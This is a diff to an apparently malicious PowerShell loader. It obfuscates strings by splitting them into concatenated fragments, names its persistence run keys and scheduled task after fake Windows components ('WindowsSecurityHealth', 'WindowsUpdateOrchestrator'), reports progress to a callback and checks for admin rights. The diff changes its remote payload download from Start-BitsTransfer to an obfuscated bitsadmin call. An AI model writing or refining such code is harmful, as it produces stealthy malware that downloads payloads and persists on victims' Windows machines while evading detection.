@@ -36,6 +36,11 @@ $n42='Win';$n43='dows';$n44='Secu';$n45='rity';$n46='Heal';$n47='th';$rkName=$n4
 $n48='Win';$n49='dows';$n50='Upda';$n51='teOr';$n52='ches';$n53='trat';$n54='or';$rkNameAdmin=$n48+$n49+$n50+$n51+$n52+$n53+$n54
 $n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n55+$n56+$n57+$n58+$n59+$n60
 
+# BITSAdmin strings
+$n61='bit';$n62='sadm';$n63='in';$bits=$n61+$n62+$n63
+$n64='/tra';$n65='nsfer';$bitsXfer=$n64+$n65
+$n66=' /pr';$n67='iori';$n68='ty h';$n69='igh';$bitsPrio=$n66+$n67+$n68+$n69
+
 $t=$env:TEMP
 $ad="$env:APPDATA\Microsoft"
 $ld="$env:LOCALAPPDATA\Microsoft"
@@ -67,18 +72,18 @@ try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.W
 log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
-# === BITS TRANSFER DOWNLOAD HELPER (dual-source, fully silent) ===
+# === BITSADMIN DOWNLOAD HELPER (dual-source) ===
 function _bitsDL($n,$dest,$label){
     foreach($src in $sources){
         $url="$src/$n"
         try{
             log "BITS: $label from $src"
-            Start-BitsTransfer -Source $url -Destination $dest -Priority High -DisplayName $label -ErrorAction Stop | Out-Null
-            if(Test-Path $dest){
+            $p=Start-Process $bits -ArgumentList "$bitsXfer `"$label`" $bitsPrio `"$url`" `"$dest`"" -Wait -NoNewWindow -PassThru
+            if($p.ExitCode -eq 0 -and (Test-Path $dest)){
                 log "BITS: $label -> $dest ($((Get-Item $dest).Length) bytes)"
                 return $true
             }
-            log "BITS: $label file missing after transfer from $src"
+            log "BITS: $label exit=$($p.ExitCode) from $src"
         }catch{log "BITS: $label fail from $src : $_"}
     }
     log "BITS: $label fail all sources"
